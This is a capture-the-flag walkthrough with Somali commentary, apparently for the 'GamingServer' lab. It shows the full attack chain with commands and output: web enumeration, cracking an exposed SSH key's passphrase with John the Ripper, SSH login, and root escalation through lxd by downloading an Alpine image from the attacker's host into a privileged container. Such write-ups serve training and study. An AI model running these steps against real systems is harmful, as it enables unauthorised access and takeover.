```bash
nmap 10.10.55.234
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

nmap 10.10.55.234 -sV -T4 -A
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak

```
## gobuster
```bash
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ gobuster dir -u http://10.10.55.234/ -w /usr/share/wordlists/dirb/common.txt  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.234/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 313] [--> http://10.10.55.234/secret/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.55.234/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

![[GamingServer/img/1.png]]![[GamingServer/img/2.png]]
```bash
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ wget http://10.10.55.234/uploads/manifesto.txt
--2024-01-15 03:20:10--  http://10.10.55.234/uploads/manifesto.txt
Connecting to 10.10.55.234:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3070 (3.0K) [text/plain]
Saving to: ‘manifesto.txt’

manifesto.txt                     100%[==========================================================>]   3.00K  5.00KB/s    in 0.6s    

2024-01-15 03:20:14 (5.00 KB/s) - ‘manifesto.txt’ saved [3070/3070]
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ wget http://10.10.55.234/uploads/dict.lst
--2024-01-15 03:20:19--  http://10.10.55.234/uploads/dict.lst
Connecting to 10.10.55.234:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2006 (2.0K)
Saving to: ‘dict.lst’

dict.lst                          100%[==========================================================>]   1.96K  --.-KB/s    in 0.01s   

2024-01-15 03:20:21 (138 KB/s) - ‘dict.lst’ saved [2006/2006]
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ wget http://10.10.55.234/uploads/meme.jpg
--2024-01-15 03:20:41--  http://10.10.55.234/uploads/meme.jpg
Connecting to 10.10.55.234:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15457 (15K) [image/jpeg]
Saving to: ‘meme.jpg’

meme.jpg                          100%[==========================================================>]  15.09K  1.47KB/s    in 10s     

2024-01-15 03:20:54 (1.47 KB/s) - ‘meme.jpg’ saved [15457/15457]

```
sawirkaan waa mene waana mid wax aanan ku jirin

![[meme.jpg]]
- dict.lst waxaa ku jira list users ah
- manifesto sido kale asigan waxaa ku jiro waa sheko iska yar
## intaan yar waxaanka helay username midkaaso loo yaqaano john```

```
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ curl -s http://10.10.55.234/ | grep "<\!--"
<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```
sidaan marki hore aan kuso arakney waxa jirtey port ssh furnaa marka waxaan isku dayey inaan userkaas aan helay iyo passowrdka aanku dayo inu ku shaqaynaayo brute force
laakin wuu iga dhidey
![[GamingServer/img/3.png]]
```bash
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ wget http://10.10.55.234/secret/secretKey
--2024-01-15 03:23:47--  http://10.10.55.234/secret/secretKey
Connecting to 10.10.55.234:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: ‘secretKey’

secretKey                         100%[==========================================================>]   1.72K  --.-KB/s    in 0.003s  

2024-01-15 03:23:48 (498 KB/s) - ‘secretKey’ saved [1766/1766]

```
markaan soo soo dagsaday seckeys file loo yaqano waxaan ku sayey inaan uu badalo hash midkaaso aan crack garen karo intaas kadib cracking ayaanku sameyey walibo anigo adegsanaayo toolka loo yaqaano john the ripper
```bash
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ ssh2john secretKey > hash.txt              
 ┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ sudo john hash.txt --wordlist=dict.lst
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2024-01-15 03:37) 100.0g/s 22200p/s 22200c/s 22200C/s baseball..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```
intaas kadib waxaan helay password anigo horey uu haysatey username waxaan sameyey inaan ku galo ssh serverka
```bash
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ chmod 400 secretKey                        
┌──(alpha㉿Sploit)-[~/ctf/GamingServer]
└─$ ssh -i secretKey john@10.10.55.234
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 14 21:47:01 UTC 2024

  System load:  0.0               Processes:           97
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.55.234
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
john@exploitable:~$ 
```
waan hack gareney systemkena kadib waxaan samenaynaa inaan noqoto admin ama super user sawabto ah hada kaliya user ayaynu nahay
```bash
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
john@exploitable:~$ 
```
john waxu ku jiraa geoupka lxd 

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

waxaan samenayaa inaan ku shubo codeka aan diyaariyey walibo anigo isticmaalayo python webserver
```
┌──(alpha㉿Sploit)-[~/ctf/GamingServer/lxd-alpine-builder]
└─$ python -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.55.234 - - [15/Jan/2024 04:11:09] "GET /alpine-v3.19-x86_64-20240115_0408.tar.gz HTTP/1.1" 200 -
```

```
john@exploitable:~$ wget http://10.8.5.88:8001/alpine-v3.19-x86_64-20240115_0408.tar.gz
--2024-01-14 22:11:16--  http://10.8.5.88:8001/alpine-v3.19-x86_64-20240115_0408.tar.gz
Connecting to 10.8.5.88:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3653076 (3.5M) [application/gzip]
Saving to: ‘alpine-v3.19-x86_64-20240115_0408.tar.gz’

alpine-v3.19-x86_64-20240115_0408 100%[==========================================================>]   3.48M  55.1KB/s    in 72s     

2024-01-14 22:12:29 (49.5 KB/s) - ‘alpine-v3.19-x86_64-20240115_0408.tar.gz’ saved [3653076/3653076]

```

```
john@exploitable:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
john@exploitable:~$ lxc image import ./alpine-v3.19-x86_64-20240115_0408.tar.gz --alias myimage
Image imported with fingerprint: 53055403a80eb58015140ac8d463559cd4ecd01d9059ad16d86d8c4d0288098a
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myimage | 53055403a80e | no     | alpine v3.19 (20240115_04:08) | x86_64 | 3.48MB | Jan 14, 2024 at 10:13pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
~ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```